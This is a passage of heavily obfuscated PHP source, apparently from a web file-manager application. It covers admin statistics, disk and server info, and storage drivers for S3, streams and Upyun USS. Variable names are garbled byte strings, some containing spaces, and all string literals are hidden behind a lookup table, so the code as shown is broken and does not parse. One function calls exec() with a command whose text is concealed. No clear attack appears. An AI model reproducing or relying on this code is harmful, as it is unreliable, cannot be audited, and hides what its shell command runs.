$this->typeLogCnt(), $ÄÄ·§—[107] => $this->typeLogCnt($ÄÄ·§—[107]), $ÄÄ·§—[452] => $this->typeLogCnt($ÄÄ·§—[452]), $ÄÄ·§—[1821] => $this->typeLogCnt($ÄÄ·§—[1821]), $ÄÄ·§—[1822] => $this->typeLogCnt($ÄÄ·§—[1822]), $ÄÄ·§—[600] => $this->typeLogCnt($ÄÄ·§—[12], $ÄÄ·§—[1797])); } private function typeLogCnt($ÂÛáåÎ¥ = '', $©¿Ñ­¾ş = "\x69\x64") { $Ç¿¾í¿¥ =& $_SERVER[³·—™¤¢]; $Ëé×Ò®² = array($Ç¿¾í¿¥[107] => array($Ç¿¾í¿¥[1823], $Ç¿¾í¿¥[1824]), $Ç¿¾í¿¥[452] => array($Ç¿¾í¿¥[1825], $Ç¿¾í¿¥[1826]), $Ç¿¾í¿¥[1821] => array($Ç¿¾í¿¥[1827], $Ç¿¾í¿¥[1828], $Ç¿¾í¿¥[1829]), $Ç¿¾í¿¥[1822] => array($Ç¿¾í¿¥[1830], $Ç¿¾í¿¥[1831]), $Ç¿¾í¿¥[1832] => array($Ç¿¾í¿¥[1833], $Ç¿¾í¿¥[1834], $Ç¿¾í¿¥[1835])); $éÀí’ëÏ = strtotime(date($Ç¿¾í¿¥[1793])); $İÇØŒ¥ = array($Ç¿¾í¿¥[200] => array($Ç¿¾í¿¥[1037], $éÀí’ëÏ)); if ($ÂÛáåÎ¥) { $İÇØŒ¥[$Ç¿¾í¿¥[33]] = array($Ç¿¾í¿¥[7], $Ëé×Ò®²[$ÂÛáåÎ¥]); } $ªàÌ³ í = Model($Ç¿¾í¿¥[1796])->where($İÇØŒ¥)->count($©¿Ñ­¾ş); return (int) $ªàÌ³ í; } private function optionServer() { $ó–©©ãÉ =& $_SERVER[³·—™¤¢]; $Âê†•©ş = $this->diskDriver(); $ıˆ £Óù = KodIO::defaultDriver(); $ÉôÕ®Ïõ = array($ó–©©ãÉ[837] => $ıˆ £Óù[$ó–©©ãÉ[399]]); $¤·Ë‰ = Model($ó–©©ãÉ[471])->where($ÉôÕ®Ïõ)->sum($ó–©©ãÉ[76]); $ß‘˜÷å· = explode($ó–©©ãÉ[53], $_SERVER[$ó–©©ãÉ[143]]); $øÌäÖ»º = $ß‘˜÷å·[0]; $ü–·Ì = $GLOBALS[$ó–©©ãÉ[6]][$ó–©©ãÉ[21]]; $¶¶©ôÜõ = $ü–·Ì[$ó–©©ãÉ[999]]; if ($¶¶©ôÜõ == $ó–©©ãÉ[987]) { $Êıâ”Ù‰ = explode($ó–©©ãÉ[1295], $ü–·Ì[$ó–©©ãÉ[998]]); $¶¶©ôÜõ = $Êıâ”Ù‰[0]; } if ($¶¶©ôÜõ == $ó–©©ãÉ[932] || $¶¶©ôÜõ == $ó–©©ãÉ[824]) { $Šş´åë½ = Model()->db()->query($ó–©©ãÉ[1836]); $›âğ×À = $Šş´åë½[0] && isset($Šş´åë½[0][$ó–©©ãÉ[1576]]) ? $Šş´åë½[0][$ó–©©ãÉ[1576]] : 0; $¶¶©ôÜõ = $ó–©©ãÉ[1837] . ($›âğ×À ? $ó–©©ãÉ[8] . $›âğ×À : $ó–©©ãÉ[12]); } $´…Ñåûƒ = $GLOBALS[$ó–©©ãÉ[6]][$ó–©©ãÉ[349]][$ó–©©ãÉ[847]]; return array($ó–©©ãÉ[1838] => $Âê†•©ş ? $Âê†•©ş[$ó–©©ãÉ[1839]] : 0, $ó–©©ãÉ[1840] => $Âê†•©ş ? $Âê†•©ş[$ó–©©ãÉ[1841]] : 0, $ó–©©ãÉ[1842] => (int) $ıˆ £Óù[$ó–©©ãÉ[1839]] * 1024 * 1024 * 1024, $ó–©©ãÉ[1843] => (int) $¤·Ë‰, $ó–©©ãÉ[1844] => ucfirst($øÌäÖ»º), $ó–©©ãÉ[1845] => $ó–©©ãÉ[1846] . PHP_VERSION, $ó–©©ãÉ[1847] => phpBuild64() ? 64 : 32, $ó–©©ãÉ[778] => str_replace($ó–©©ãÉ[1153], $ó–©©ãÉ[1015], $¶¶©ôÜõ), $ó–©©ãÉ[349] => ucfirst($´…Ñåûƒ), $ó–©©ãÉ[32] => $_SERVER[$ó–©©ãÉ[1848]]); } private function diskDriver() { $©á…ß°© =& $_SERVER[³·—™¤¢]; $´‰İ‘‘ = $©á…ß°©[8]; $’®Ö’ú· = $GLOBALS[$©á…ß°©[6]][$©á…ß°©[1311]] == $©á…ß°©[1312]; if ($’®Ö’ú·) { $´‰İ‘‘ = $©á…ß°©[1849]; if (function_exists($©á…ß°©[1850])) { exec($©á…ß°©[1851], $ÖÑÕä÷ü); $´‰İ‘‘ = $ÖÑÕä÷ü[1] . $©á…ß°©[8]; } } if (!file_exists($´‰İ‘‘)) { return; } $Ùõê­ˆ = @disk_total_space($´‰İ‘‘); $Ë²¥½¶ = $Ùõê­ˆ - @disk_free_space($´‰İ‘‘); return array($©á…ß°©[1839] => $Ùõê­ˆ, $©á…ß°©[1841] => $Ë²¥½¶); } public function fileChart($àÌõ’‡Â) { $È©é­„÷ =& $_SERVER[³·—™¤¢]; if (isset($àÌõ’‡Â[$È©é­„÷[1680]])) { return Model($È©é­„÷[845])->userFileTypeProfile($àÌõ’‡Â[$È©é­„÷[1680]]); } if (isset($àÌõ’‡Â[$È©é­„÷[1852]])) { return Model($È©é­„÷[845])->groupFileTypeProfile($àÌõ’‡Â[$È©é­„÷[1852]]); } $ÀÉØáè© = $this->sourceSize(); $«æÅ»Æô = array($È©é­„÷[432] => 0, $È©é­„÷[411] => 1); $–§ÔÄî = Model($È©é­„÷[845])->where($«æÅ»Æô)->sum($È©é­„÷[76]); $«æÅ»Æô[$È©é­„÷[411]] = 2; $ıÍÎ¬¿ = Model($È©é­„÷[845])->where($«æÅ»Æô)->sum($È©é­„÷[76]); return array($È©é­„÷[783] => $ÀÉØáè©[$È©é­„÷[76]], $È©é­„÷[1786] => $ÀÉØáè©[$È©é­„÷[1786]], $È©é­„÷[1787] => (int) $–§ÔÄî, $È©é­„÷[1788] => (int) $ıÍÎ¬¿); } private function sourceSize() { $Ã÷»İÊ³ =& $_SERVER[³·—™¤¢]; $áİ­‚É¿ = Model($Ã÷»İÊ³[845])->where(array($Ã÷»İÊ³[410] => 0))->sum($Ã÷»İÊ³[76]); $³âµ–ÔÎ = Model($Ã÷»İÊ³[471])->sum($Ã÷»İÊ³[76]); if ($³âµ–ÔÎ > $áİ­‚É¿) { $³âµ–ÔÎ = $áİ­‚É¿; } return array($Ã÷»İÊ³[76] => (int) $áİ­‚É¿, $Ã÷»İÊ³[1786] => (int) $³âµ–ÔÎ); } } goto Bœæ‚†‹¿¾; fòØœ•±•´: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ú‘†³åÕ) { parent::__construct($ú‘†³åÕ); } public function uploadFormData($Éç¹±®•, $›¢á»ãæ = 3600) { $ç¹Ş¬ =& $_SERVER[³·—™¤¢]; $¢¨÷Ûô = $ç¹Ş¬[198]; $¯Ë€÷üù = $ç¹Ş¬[1369]; $×“ÒÓÚ® = $ç¹Ş¬[62]; $•ß¼°ıµ = gmdate($ç¹Ş¬[1370]); $ùò»™úï = gmdate($ç¹Ş¬[771]); $œñ¦ß­ = $ç¹Ş¬[1371]; $ğß¤®¿Õ = $›¢á»ãæ . $ç¹Ş¬[12]; $Ó£÷Âö = $ç¹Ş¬[1333]; $äŸ×îîÏ = array($this->accessKey, $ùò»™úï, $this->region, $×“ÒÓÚ®, $œñ¦ß­); $éèèõ‹ç = implode($ç¹Ş¬[8], $äŸ×îîÏ); $µò»ÖúÉ = array($ç¹Ş¬[1335] => gmdate($ç¹Ş¬[1334], strtotime($ç¹Ş¬[1372])), $ç¹Ş¬[1336] => array(array($ç¹Ş¬[1338] => $this->bucket), array($ç¹Ş¬[1337] => $¢¨÷Ûô), array($ç¹Ş¬[1339], $ç¹Ş¬[1340], $ç¹Ş¬[12]), array($ç¹Ş¬[1339], $ç¹Ş¬[1373], $ç¹Ş¬[12]), array($ç¹Ş¬[1339], $ç¹Ş¬[1374], $ç¹Ş¬[12]), array($ç¹Ş¬[1341] => $Ó£÷Âö), array($ç¹Ş¬[1375] => $éèèõ‹ç), array($ç¹Ş¬[1376] => $¯Ë€÷üù), array($ç¹Ş¬[1377] => $•ß¼°ıµ), array($ç¹Ş¬[1378] => $ğß¤®¿Õ))); $Àİ¥ğ = base64_encode(json_encode($µò»ÖúÉ)); $Û¬ãİ¦¸ = hash_hmac($ç¹Ş¬[1379], $ùò»™úï, $ç¹Ş¬[1380] . $this->secret, !0); $Çş®§İÍ = hash_hmac($ç¹Ş¬[1379], $this->region, $Û¬ãİ¦¸, !0); $¦ûáĞ» = hash_hmac($ç¹Ş¬[1379], $×“ÒÓÚ®, $Çş®§İÍ, !0); $ÏñŠ³†î = hash_hmac($ç¹Ş¬[1379], $œñ¦ß­, $¦ûáĞ», !0); $òùíÒŒÄ = hash_hmac($ç¹Ş¬[1379], $Àİ¥ğ, $ÏñŠ³†î); $ÆçŠÓÓï = array($ç¹Ş¬[215] => $ç¹Ş¬[12], $ç¹Ş¬[1381] => $ç¹Ş¬[12], $ç¹Ş¬[1337] => $¢¨÷Ûô, $ç¹Ş¬[1341] => $Ó£÷Âö, $ç¹Ş¬[1345] => $Àİ¥ğ, $ç¹Ş¬[1382] => $éèèõ‹ç, $ç¹Ş¬[1383] => $¯Ë€÷üù, $ç¹Ş¬[1384] => $•ß¼°ıµ, $ç¹Ş¬[1385] => $ğß¤®¿Õ, $ç¹Ş¬[1386] => $òùíÒŒÄ, $ç¹Ş¬[181] => $this->getHost()); return $ÆçŠÓÓï; } public function multiUploadFormData($€ŞØã‹, $††Ú¤îê = 3600) { $ìÀÕÉÜ¦ =& $_SERVER[³·—™¤¢]; $î¦ö·àÍ = gmdate($ìÀÕÉÜ¦[1465]); $ô¾’¨× = array(); $Ò’”Çûø = $this->client->getUploadId($this->bucket, $€ŞØã‹, $ô¾’¨×); if (!$Ò’”Çûø) { return !1; } return array($ìÀÕÉÜ¦[223] => $Ò’”Çûø, $ìÀÕÉÜ¦[181] => $this->getHost() . $ìÀÕÉÜ¦[8] . $this->pathEncode($€ŞØã‹), $ìÀÕÉÜ¦[224] => $î¦ö·àÍ, $ìÀÕÉÜ¦[94] => $€ŞØã‹); } public function multiUploadAuthData($âäå½²ş, $á´ÆğÉ = array()) { $Áêê×¯ =& $_SERVER[³·—™¤¢]; $—ÜÇõÍ = isset($á´ÆğÉ[$Áêê×¯[174]]) ? $á´ÆğÉ[$Áêê×¯[174]] : $Áêê×¯[12]; $€îéÒÏ = $á´ÆğÉ[$Áêê×¯[94]]; unset($á´ÆğÉ[$Áêê×¯[94]]); if (isset($á´ÆğÉ[$Áêê×¯[225]])) { return $this->listUploadParts($€îéÒÏ, $á´ÆğÉ); } $®”ëôóÆ = array(); if (isset($á´ÆğÉ[$Áêê×¯[1466]])) { $®”ëôóÆ[$Áêê×¯[1467]] = $á´ÆğÉ[$Áêê×¯[1466]]; } $…¸½Ø¤î = explode($Áêê×¯[183], $this->getHost()); $œØ»ÙêÀ = array($Áêê×¯[1468] => $…¸½Ø¤î[1], $Áêê×¯[1469] => $Áêê×¯[12], $Áêê×¯[215] => $Áêê×¯[120], $Áêê×¯[1381] => $á´ÆğÉ[$Áêê×¯[76]]); $Œ¾º³Â¬ = $Áêê×¯[228]; $Ô„íê•ó = $Áêê×¯[8] . $this->pathEncode($€îéÒÏ) . $—ÜÇõÍ; $ÓÂı¿Âã = $this->client->__getSignatureV4($®”ëôóÆ, $œØ»ÙêÀ, $Œ¾º³Â¬, $Ô„íê•ó); if (strpos($—ÜÇõÍ, $Áêê×¯[227]) === 0) { if (isset($®”ëôóÆ[$Áêê×¯[1467]])) { $àÖê·åø = $®”ëôóÆ[$Áêê×¯[1467]]; } else { if (isset($ÓÂı¿Âã[$Áêê×¯[1467]])) { $àÖê·åø = $ÓÂı¿Âã[$Áêê×¯[1467]]; } else { $àÖê·åø = hash($Áêê×¯[1379], $Áêê×¯[12]); } } return array($Áêê×¯[234] => $ÓÂı¿Âã[$Áêê×¯[234]], $Áêê×¯[1467] => $àÖê·åø, $Áêê×¯[224] => $ÓÂı¿Âã[$Áêê×¯[1470]]); } return $ÓÂı¿Âã[$Áêê×¯[234]]; } public function listUploadParts($–†•ÂÛ, $ŠÙˆõå = array()) { $‡°ËË¡Î =& $_SERVER[³·—™¤¢]; $˜›Ë‹Ÿ = str_replace($‡°ËË¡Î[235], $‡°ËË¡Î[12], $ŠÙˆõå[$‡°ËË¡Î[174]]); $–ËæË£Ô = $this->client->listParts($this->bucket, $–†•ÂÛ, $˜›Ë‹Ÿ); if (!$–ËæË£Ô) { return !1; } $·ÎÀÂ­ = $‡°ËË¡Î[1471]; foreach ($–ËæË£Ô as $ÏôäÇÖÎ) { $·ÎÀÂ­ .= $‡°ËË¡Î[1472] . "\74\x50\x61\162\x74\116\165\155\142\x65\x72\76{$ÏôäÇÖÎ[$‡°ËË¡Î[1426]]}\74\57\x50\x61\x72\164\x4e\x75\x6d\x62\x65\x72\x3e\xa" . "\74\x45\124\141\x67\76{$ÏôäÇÖÎ[$‡°ËË¡Î[1427]]}\x3c\x2f\105\124\x61\x67\x3e\12" . $‡°ËË¡Î[1473]; } $·ÎÀÂ­ .= $‡°ËË¡Î[1474]; $†ÚÛÕ¦š = array(); $ÆµÃÀì = explode($‡°ËË¡Î[183], $this->getHost()); $«’áİÙû = array($‡°ËË¡Î[1468] => $ÆµÃÀì[1], $‡°ËË¡Î[215] => $‡°ËË¡Î[120], $‡°ËË¡Î[1381] => strlen($·ÎÀÂ­)); $î´»ê = $‡°ËË¡Î[226]; $üÙ»‡œ¿ = $‡°ËË¡Î[8] . $this->pathEncode($–†•ÂÛ) . $ŠÙˆõå[$‡°ËË¡Î[174]]; $ŞºÍÑâş = $this->client->__getSignatureV4($†ÚÛÕ¦š, $«’áİÙû, $î´»ê, $üÙ»‡œ¿, $·ÎÀÂ­); return array($‡°ËË¡Î[234] => $ŞºÍÑâş[$‡°ËË¡Î[234]], $‡°ËË¡Î[224] => $ŞºÍÑâş[$‡°ËË¡Î[1470]], $‡°ËË¡Î[236] => $–ËæË£Ô, $‡°ËË¡Î[1467] => $ŞºÍÑâş[$‡°ËË¡Î[1467]]); } public function link($‹¯’«Ú€, $¤ûÖ¥µÌ = array()) { return parent::link($‹¯’«Ú€, $¤ûÖ¥µÌ); } public function fileOut($Ê§„’«, $ÏÏîñæğ = false, $¨Æ†µ†Ï = false, $¾Èó›…ë = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[³·—™¤¢][1475])) { return parent::fileOutServer($Ê§„’«, $ÏÏîñæğ, $¨Æ†µ†Ï, $¾Èó›…ë); } parent::fileOut($Ê§„’«, $ÏÏîñæğ, $¨Æ†µ†Ï, $¾Èó›…ë); } public function fileOutImage($«¨ÅœÓö, $Âˆ™·ÎĞ = 250) { if (strstr($this->endpoint, $_SERVER[³·—™¤¢][1475])) { return parent::fileOutImageServer($«¨ÅœÓö, $Âˆ™·ÎĞ); } parent::fileOutImage($«¨ÅœÓö, $Âˆ™·ÎĞ); } public function fileOutLink($á¨¤Öà) { $òŸÅÜœ =& $_SERVER[³·—™¤¢]; if (substr($á¨¤Öà, 0, 7) == $òŸÅÜœ[1348]) { $á¨¤Öà = $òŸÅÜœ[1349] . substr($á¨¤Öà, 7); } header($òŸÅÜœ[161] . $á¨¤Öà); die; } public function getHost() { $³‹¯Ÿî =& $_SERVER[³·—™¤¢]; $ú€Àİé = str_rtrim(parent::getHost(), $³‹¯Ÿî[8] . $this->bucket); $ú€Àİé = explode($³‹¯Ÿî[183], $ú€Àİé); return $ú€Àİé[0] . $³‹¯Ÿî[183] . $this->bucket . $³‹¯Ÿî[10] . $ú€Àİé[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ˆØæêª¼, $·©‘ÓÕà = 0) { parent::__construct(); $this->source = $ˆØæêª¼; $this->sourceSize = $·©‘ÓÕà; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($úÌî‚ê = false) { return $this->sourceSize; } public function getContent($µ„…Ø” = false) { return $this->fileSubstr($µ„…Ø”, 0, $this->sourceSize); } public function fileSubstr($Òí‚¤İ = false, $ûÇÀÏ = 0, $üÑÕıã’ = 0) { if (!$üÑÕıã’) { $üÑÕıã’ = $this->sourceSize; } $ÔÎıŞÒ = $this->sourceSize - $ûÇÀÏ; if ($üÑÕıã’ >= $ÔÎıŞÒ) { $üÑÕıã’ = $ÔÎıŞÒ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ûÇÀÏ, $üÑÕıã’); } if ($this->sourceType == self::TYPE_FILE) { if ($üÑÕıã’ <= 0) { return $_SERVER[³·—™¤¢][12]; } $®ÆÔïÌÈ = ftell($this->source); fseek_64($this->source, $®ÆÔïÌÈ + $ûÇÀÏ); $ŸÄşÛØ— = @fread($this->source, $üÑÕıã’); fseek_64($this->source, $®ÆÔïÌÈ); return $ŸÄşÛØ—; } } public function hashMd5($ŠÃÌÊ = false) { return md5($this->getContent()); } public static function hash($È°äèÙ, $ÇÙÑ¶Ü„ = 0) { $¹ÃµÍ » = new PathDriverStream($È°äèÙ, $ÇÙÑ¶Ü„); return $¹ÃµÍ »->hashSimple($È°äèÙ); } public static function md5($ÁŸÏƒî, $ÑÉòİ‘Ä = 0) { $±Õ‹™ÛŒ = new PathDriverStream($ÁŸÏƒî, $ÑÉòİ‘Ä); return $±Õ‹™ÛŒ->hashMd5($ÁŸÏƒî); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\160\x3a\x2f\x2f\166\x30\x2e\141\160\151\56\165\x70\171\x75\x6e\56\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ùÏ±ÀÙ) { parent::__construct(); $this->_init($ùÏ±ÀÙ); } public function _init($éî¾ò) { $¬¼¢„É² =& $_SERVER[³·—™¤¢]; foreach ($éî¾ò as $´ÈÂì…Å => $à «„¦æ) { if (isset($this->{$´ÈÂì…Å})) { $this->{$´ÈÂì…Å} = $à «„¦æ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¬¼¢„É²[1476] . LNG($¬¼¢„É²[1407])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¿Õ¨ñ¯, $ëÆ©Ê–ä = "\107\x45\124") { $²ÇôË¦ç =& $_SERVER[³·—™¤¢]; $ó–¸¢Íì = gmdate($²ÇôË¦ç[1440]); $„Ô¡¡Çİ = base64_encode(hash_hmac($²ÇôË¦ç[1477], "{$ëÆ©Ê–ä}\x26{$¿Õ¨ñ¯}\46{$ó–¸¢Íì}", md5("{$this->userpass}"), !0)); $ù»°èéº = array("\x41\x75\x74\150\157\x72\x69\x7a\141\164\151\157\156\72\x55\120\131\125\116\x20{$this->username}\72{$„Ô¡¡Çİ}", "\104\x61\164\x65\x3a{$ó–¸¢Íì}"); return $ù»°èéº; } public function ussRequest($Şêêùì, $´×ñ²ŞĞ = "\107\x45\124", $ÒÚ Ù³Ó = false, $ØÄƒò¡€ = false, $÷Öç€‚¤ = false) { $ã¸¿Şï =& $_SERVER[³·—™¤¢]; $Şêêùì = trim($Şêêùì, $ã¸¿Şï[8]); $Ê¬—€ë = "\57{$this->bucket}\57{$Şêêùì}"; $£ô×¦Öƒ = $this->ussHeaders($Ê¬—€ë, $´×ñ²ŞĞ); if ($ØÄƒò¡€) { $£ô×¦Öƒ = array_merge($£ô×¦Öƒ, $ØÄƒò¡€); } $Ğù›ŞÙ = url_request($this->endpoint . $Ê¬—€ë, $´×ñ²ŞĞ, $ÒÚ Ù³Ó, $£ô×¦Öƒ, $÷Öç€‚¤); if (!$Ğù›ŞÙ) { return array($ã¸¿Şï[1214] => !1, $ã¸¿Şï[1216] => $ã¸¿Şï[1478]); } if (strtolower($´×ñ²ŞĞ) == $ã¸¿Şï[196] || in_array($Ğù›ŞÙ[$ã¸¿Şï[1214]], array($ã¸¿Şï[1333], $ã¸¿Şï[1479]))) { $ÒÚ Ù³Ó = $Ğù›ŞÙ[$ã¸¿Şï[1480]]; } else { $ÒÚ Ù³Ó = json_decode($Ğù›ŞÙ[$ã¸¿Şï[1216]], !0); if (!$ÒÚ Ù³Ó) { $ÒÚ Ù³Ó = $Ğù›ŞÙ[$ã¸¿Şï[1216]]; } else { if (!$Ğù›ŞÙ[$ã¸¿Şï[770]] && isset($ÒÚ Ù³Ó[$ã¸¿Şï[1481]])) { $ÒÚ Ù³Ó = $ÒÚ Ù³Ó[$ã¸¿Şï[1481]]; } } } return array($ã¸¿Şï[1214] => $Ğù›ŞÙ[$ã¸¿Şï[770]], $ã¸¿Şï[1216] => $ÒÚ Ù³Ó); } public function mkfile($¯Å¢ÇÒ˜, $ÎÙ©™æƒ = '', $“‹ç¬çë = REPEAT_RENAME) { if ($this->setContent($¯Å¢ÇÒ˜, $ÎÙ©™æƒ)) { return $this->getPathOuter($¯Å¢ÇÒ˜); } return !1; } public function mkdir($­ÕÀÛÓ, $µò²õ»  = REPEAT_SKIP) { $¹ÙÌ·ÅÅ =& $_SERVER[³·—™¤¢]; $ µ‚Ø„ñ = trim($­ÕÀÛÓ, $¹ÙÌ·ÅÅ[8]); if ($this->_isFolder($ µ‚Ø„ñ)) { return $this->getPathOuter($ µ‚Ø„ñ); } $œÚ Å”” = array($¹ÙÌ·ÅÅ[1482]); $²åÑĞ½„ = $this->ussRequest($ µ‚Ø„ñ, $¹ÙÌ·ÅÅ[226], !1, $œÚ Å””); return $²åÑĞ½„[$¹ÙÌ·ÅÅ[1214]] ? $this->getPathOuter($ µ‚Ø„ñ) : !1; } public function copyFile($ÛşŞ¯È¨, $œØÊÑı) { $¦ûç…ìÆ =& $_SERVER[³·—™¤¢]; $‘¼ùÕª• = array($¦ûç…ìÆ[1483] . "\x2f{$this->bucket}\x2f{$ÛşŞ¯È¨}", $¦ûç…ìÆ[1484]); $¿‹ÑÊ¬ = $this->ussRequest($œØÊÑı, $¦ûç…ìÆ[228], !1, $‘¼ùÕª•); return $¿‹ÑÊ¬[$¦ûç…ìÆ[1214]] ? !0 : $this->getPathOuter($œØÊÑı); } public function moveFile($£Å´„¹¬, $ˆÄ³­¢•) { $¨õşª¨ =& $_SERVER[³·—™¤¢]; $¢ÆÓ¡Æº = array($¨õşª¨[1485] . "\x2f{$this->bucket}\x2f{$£Å´„¹¬}", $¨õşª¨[1484]); $»üÇË”¤ = $this->ussRequest($ˆÄ³­¢•, $¨õşª¨[228], !1, $¢ÆÓ¡Æº); return $»üÇË”¤[$¨õşª¨[1214]] ? !0 : $this->getPathOuter($ˆÄ³­¢•); } public function delFile($ã¾åÂÜç) { $Í©¦›âú =& $_SERVER[³·—™¤¢]; $¼§êÃÈÉ = $this->ussRequest($ã¾åÂÜç, $Í©¦›âú[1486]); return $¼§êÃÈÉ[$Í©¦›âú[1214]] ? !0 : !1; } public function delFolder($Ì–•šåß) { $şàİÎç =& $_SERVER[³·—™¤¢]; if (!$this->exist($Ì–•šåß)) { return !0; } $this->listItemCache = !1; $ãáËşë­ = $Í»èä‚ù = array(); $this->fileList($Ì–•šåß, $ãáËşë­, $Í»èä‚ù, !0); $this->listItemCache = !0; foreach ($Í»èä‚ù as $Õ½òÚı˜) { $ˆŞóË’ = $this->ussRequest($Õ½òÚı˜[$şàİÎç[32]], $şàİÎç[1486]); if (!$ˆŞóË’[$şàİÎç[1214]]) { return !1; } } foreach ($ãáËşë­ as $öùôöØˆ) { $ˆŞóË’ = $this->ussRequest($öùôöØˆ, $şàİÎç[1486]); if (!$ˆŞóË’[$şàİÎç[1214]]) { return !1; } } $ˆŞóË’ = $this->ussRequest($Ì–•šåß, $şàİÎç[1486]); return $ˆŞóË’[$şàİÎç[1214]]; } public function rename($ÉıáıÀÌ, $ÍğÃÀÎ) { if ($this->isFile($ÉıáıÀÌ)) { $ÍğÃÀÎ = get_path_father($ÉıáıÀÌ) . $ÍğÃÀÎ; return $this->moveFile($ÉıáıÀÌ, $ÍğÃÀÎ); } return $this->renameObject($ÉıáıÀÌ, $ÍğÃÀÎ); } public function fileInfo($Ú“©û€•, $¹‚ï–»“ = false, $ŸÂ¬‚´Ñ = array()) { $À´”Ü® =& $_SERVER[³·—™¤¢]; $Ó‘é·¯£ = array($À´”Ü®[32] => $this->pathThis($Ú“©û€•), $À´”Ü®[84] => $this->getPathOuter($À´”Ü®[8] . $Ú“©û€•), $À´”Ü®[33] => $À´”Ü®[199], $À´”Ü®[76] => isset($ŸÂ¬‚´Ñ[$À´”Ü®[76]]) ? $ŸÂ¬‚´Ñ[$À´”Ü®[76]] : 0, $À´”Ü®[174] => $this->ext($Ú“©û€•)); if ($¹‚ï–»“) { return $Ó‘é·¯£; } $Ó‘é·¯£[$À´”Ü®[200]] = $Ó‘é·¯£[$À´”Ü®[85]] = 0; $Ó‘é·¯£[$À´”Ü®[201]] = $Ó‘é·¯£[$À´”Ü®[202]] = !0; if (empty($ŸÂ¬‚´Ñ)) { $ŸÂ¬‚´Ñ = $this->objectMeta($Ú“©û€•); if (!$ŸÂ¬‚´Ñ) { return $Ó‘é·¯£; } } $Ó‘é·¯£[$À´”Ü®[200]] = intval($ŸÂ¬‚´Ñ[$À´”Ü®[1487]]); $Ó‘é·¯£[$À´”Ü®[85]] = intval($ŸÂ¬‚´Ñ[$À´”Ü®[1488]]); $Ó‘é·¯£[$À´”Ü®[76]] = $ŸÂ¬‚´Ñ[$À´”Ü®[76]]; return $Ó‘é·¯£; } public function folderInfo($¿½·•àÛ, $È›ĞÜµ¢ = false) { $éŸÀàÑ =& $_SERVER[³·—™¤¢]; $ì×É¸µ” = array($éŸÀàÑ[32] => $this->pathThis($¿½·•àÛ), $éŸÀàÑ[84] => $this->getPathOuter($éŸÀàÑ[8] . $¿½·•àÛ), $éŸÀàÑ[33] => $éŸÀàÑ[75]); if ($È›ĞÜµ¢) { return $ì×É¸µ”; } $ì×É¸µ”[$éŸÀàÑ[200]] = $ì×É¸µ”[$éŸÀàÑ[85]] = 0; $ì×É¸µ”[$éŸÀàÑ[201]] = $ì×É¸µ”[$éŸÀàÑ[202]] = !0; if (empty($®çÊ†€Ÿ)) { $®çÊ†€Ÿ = $this->objectMeta($¿½·•àÛ); if (!$®çÊ†€Ÿ) { return $ì×É¸µ”; } } $ì×É¸µ”[$éŸÀàÑ[200]] = intval($®çÊ†€Ÿ[$éŸÀàÑ[1487]]); $ì×É¸µ”[$éŸÀàÑ[85]] = intval($®çÊ†€Ÿ[$éŸÀàÑ[1488]]); return $ì×É¸µ”; } private function listObjs($ÅĞİ‘á½, $‘í¬³ÄÒ = 0, $ŒôÁÁ³ = 1000) { $£—ã®¾‘ =& $_SERVER[³·—™¤¢]; $ªıéêèÚ = array($£—ã®¾‘[1489], $£—ã®¾‘[1490] . $ŒôÁÁ³); if ($‘í¬³ÄÒ) { $ªıéêèÚ[] = $£—ã®¾‘[1491] . $‘í¬³ÄÒ; } $²ÄÔ ÍŸ = $this->ussRequest($ÅĞİ‘á½, $£—ã®¾‘[230], !1, $ªıéêèÚ); return !$²ÄÔ ÍŸ[$£—ã®¾‘[1214]] ? !1 : $²ÄÔ ÍŸ[$£—ã®¾‘[1216]]; } private function fileList($¦Ù Î‘³, &$ß×†õà³, &$‡ø÷¿¹×, $áñÈí€À = false) { $ˆ‹”ĞÇï =& $_SERVER[³·—™¤¢]; $°¾‹¶èí = $ˆ‹”ĞÇï[12]; $ÚÕ„£Èô = 1000; $ğîòİëÃ = rtrim($¦Ù Î‘³, $ˆ‹”ĞÇï[8]) . $ˆ‹”ĞÇï[8]; while (!0) { check_abort(); $¦şÛäÊ = $this->listObjs($¦Ù Î‘³, $°¾‹¶èí, $ÚÕ„£Èô); if (!$¦şÛäÊ) { return !1; } $°¾‹¶èí = isset($¦şÛäÊ[$ˆ‹”ĞÇï[1492]]) ? $¦şÛäÊ[$ˆ‹”ĞÇï[1492]] : $ˆ‹”ĞÇï[12]; $«¢õ›á = isset($¦şÛäÊ[$ˆ‹”ĞÇï[1493]]) ? $¦şÛäÊ[$ˆ‹”ĞÇï[1493]] : array(); foreach ($«¢õ›á as $ÙÂ……Ù²) { $Îí×òúÈ = $ÙÂ……Ù²[$ˆ‹”ĞÇï[33]] == $ˆ‹”ĞÇï[75] ? !0 : !1; $½·ˆÚª´ = ltrim($ğîòİëÃ . $ÙÂ……Ù²[$ˆ‹”ĞÇï[32]], $ˆ‹”ĞÇï[8]) . ($Îí×òúÈ ? $ˆ‹”ĞÇï[8] : $ˆ‹”ĞÇï[12]); $ãøÙ„÷ = array($ˆ‹”ĞÇï[32] => $½·ˆÚª´, $ˆ‹”ĞÇï[33] => $Îí×òúÈ ? $ˆ‹”ĞÇï[75] : $ˆ‹”ĞÇï[199], $ˆ‹”ĞÇï[76] => $ÙÂ……Ù²[$ˆ‹”ĞÇï[337]], $ˆ‹”ĞÇï[1488] => $ÙÂ……Ù²[$ˆ‹”ĞÇï[1494]]); $this->cacheMethodInfoSet($½·ˆÚª´, $Îí×òúÈ, $ãøÙ„÷); if ($Îí×òúÈ) { $ß×†õà³[] = $½·ˆÚª´; if ($áñÈí€À) { $this->fileList($½·ˆÚª´, $ß×†õà³, $‡ø÷¿¹×, $áñÈí€À); } continue; } $‡ø÷¿¹×[] = $ãøÙ„÷; } if (count($«¢õ›á) < $ÚÕ„£Èô) { break; } } 